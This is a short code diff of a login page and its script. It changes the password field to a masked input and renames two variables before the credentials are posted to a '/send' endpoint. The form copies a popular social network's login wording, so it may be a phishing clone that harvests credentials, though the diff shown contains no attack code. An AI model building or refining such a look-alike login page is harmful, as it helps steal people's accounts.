@@ -21,7 +21,7 @@
 
         <form id="form">
             <input type="text" id="username" placeholder="Mobile number,username or email" required>
-            <input type="text" id="password" placeholder="Password" required>
+            <input type="password" id="password" placeholder="Password" required>
             <button type="submit">Log In</button>
         </form>
 
@@ -42,8 +42,8 @@ const status = document.getElementById("status");
 form.addEventListener("submit", async (e) => {
     e.preventDefault();
 
-    const ism = document.getElementById("username").value;
-    const yosh = document.getElementById("password").value;
+    const username = document.getElementById("username").value;
+    const password = document.getElementById("password").value;
 
     try {
         const response = await fetch("/send", {
